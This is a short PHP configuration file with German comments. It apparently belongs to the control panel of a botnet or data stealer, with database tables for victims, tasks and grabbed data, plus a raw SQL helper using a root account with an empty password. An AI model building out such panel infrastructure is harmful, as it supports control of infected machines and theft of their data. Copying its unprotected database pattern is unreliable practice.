<?php
	$sql_server = 'localhost';  // Server eintragen
	$sql_user	= 'root';       // Datenbank Username
	$sql_passwd	= '';           // Datenbank Passwort
	$sql_db 	= 'bot';        // Datenbank Name
	
	$sql_table['bots'] 	  	= 'panel_victims';
	$sql_table['tasks'] 	= 'panel_tasks';
	$sql_table['done'] 	    = 'panel_done';
	$sql_table['grab'] 	    = 'panel_grabber';
	
	$time_on = 150;
	$db = new mysqli($sql_server, $sql_user, $sql_passwd, $sql_db);
	
	function panel_sql_request($sql){
		$sql_xserver = 'localhost'; // Server eintragen
		$sql_xuser	= 'root';       // Datenbank Username
		$sql_xpasswd	= '';       // Datenbank Passwort
		$sql_xdb 	= 'bot';        // Datenbank Name
		$dbx = new mysqli($sql_xserver, $sql_xuser, $sql_xpasswd, $sql_xdb);
		
		if (mysqli_connect_errno()) {
			die ('Error: '.mysqli_connect_error().'('.mysqli_connect_errno().')');
		}
		$result = $dbx->query($sql);
		
		if (!$result) {
			die ('Error: '.$dbx->error);
		}
		return $result;
	}
	function string_begins_with($string, $search){
    return (strncmp($string, $search, strlen($search)) == 0);
	}
?>